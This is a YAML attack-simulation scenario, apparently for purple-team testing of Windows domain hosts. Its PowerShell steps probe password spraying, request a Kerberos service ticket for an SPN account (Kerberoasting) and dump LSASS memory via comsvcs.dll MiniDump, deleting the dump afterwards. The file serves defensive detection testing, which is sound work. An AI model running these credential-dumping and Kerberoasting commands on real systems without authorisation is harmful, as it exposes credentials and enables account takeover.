id: purplesharp-ad-drill
name: PurpleSharp AD Credential Drill (Hybrid)
description: >
  Active Directory credential-access drill based on PurpleSharp methodology,
  covering the three highest-signal AD techniques: Password Spraying
  (T1110.003), Kerberoasting (T1558.003), and LSASS memory dumping (T1003.001).

  This is a HYBRID scenario. In Posture mode (default, safe on any host) it
  validates the defences against these techniques (LSA Protection, WDigest,
  Credential Guard, LSASS audit, Kerberos AES, account-lockout policy). In
  LIVE execution mode it actually performs the three techniques in a
  self-cleaning, lab-safe way to generate genuine SOC/EDR/SIEM telemetry
  (Security Event IDs 4625, 4769 and Sysmon Event ID 10).

  Per-OS coverage: Windows domain-joined hosts only. On Linux/macOS the
  scenario reports "not applicable".

  SAFETY: Live mode requires a domain-joined Windows TEST VM with a snapshot.
  It WILL trigger Defender/EDR by design, needs administrator/SYSTEM rights for
  the LSASS step, and each step cleans up after itself. Never run live mode on
  a production endpoint.
author: Audspect Research
executable: true
local_check: true
tags:
  - ad
  - purplesharp
  - credential-access
  - kerberoasting
  - lsass
  - password-spray
  - bfsi
  - hybrid
mitre_phases:
  - credential-access

steps:
  - name: "Password Spraying (single lockout-safe probe)"
    technique_id: T1110.003
    framework: custom
    executor: powershell
    timeout_sec: 30
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $dom = (Get-CimInstance Win32_ComputerSystem).Domain
      if (-not $dom -or $dom -eq 'WORKGROUP') {
        Write-Output "SKIP: host is not domain-joined — password spraying requires Active Directory."
        return
      }
      Add-Type -AssemblyName System.DirectoryServices.AccountManagement
      $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $dom)
      # Single failed auth against a NON-EXISTENT random probe account.
      # Cannot lock out any real account; produces Security Event ID 4625.
      $probe = "bas_spray_probe_$(Get-Random)"
      [void]$ctx.ValidateCredentials($probe, "BAS-Spray-Test!$(Get-Random)")
      Write-Output "EXEC: issued one failed domain authentication for non-existent probe '$probe' — expect Security Event ID 4625. Lockout-safe (no real account targeted)."
    cleanup: ""

  - name: "Kerberoasting (single TGS request)"
    technique_id: T1558.003
    framework: custom
    executor: powershell
    timeout_sec: 30
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $dom = (Get-CimInstance Win32_ComputerSystem).Domain
      if (-not $dom -or $dom -eq 'WORKGROUP') {
        Write-Output "SKIP: host is not domain-joined — Kerberoasting requires Active Directory."
        return
      }
      Add-Type -AssemblyName System.IdentityModel
      $searcher = New-Object System.DirectoryServices.DirectorySearcher
      $searcher.Filter = '(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))'
      $res = $searcher.FindOne()
      if (-not $res) {
        Write-Output "SKIP: no SPN-enabled user accounts found in the domain."
        return
      }
      $spn = $res.Properties['serviceprincipalname'][0]
      [void](New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn)
      Write-Output "EXEC: requested a Kerberos TGS for SPN '$spn' — expect Security Event ID 4769. No ticket is exported or cracked."
    cleanup: |
      klist purge | Out-Null

  - name: "LSASS Memory Dump (create + immediate delete)"
    technique_id: T1003.001
    framework: custom
    executor: powershell
    timeout_sec: 60
    command: |
      $ErrorActionPreference = 'SilentlyContinue'
      $lsass = Get-Process lsass
      if (-not $lsass) { Write-Output "SKIP: could not locate the LSASS process."; return }
      $out = Join-Path $env:TEMP ("bas_lsass_{0}.dmp" -f (Get-Random))
      Start-Process rundll32.exe -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) `"$out`" full" -Wait -WindowStyle Hidden
      if (Test-Path $out) {
        $sz = (Get-Item $out).Length
        Remove-Item $out -Force
        Write-Output "FAIL: LSASS MiniDump of $sz bytes was created via comsvcs.dll (then deleted) — expect Sysmon Event ID 10. LSASS is NOT protected against credential dumping."
      } else {
        Write-Output "PASS: LSASS dump produced no file — likely blocked by RunAsPPL / Credential Guard / Defender (good)."
      }
    cleanup: |
      Remove-Item (Join-Path $env:TEMP 'bas_lsass_*.dmp') -Force -ErrorAction SilentlyContinue
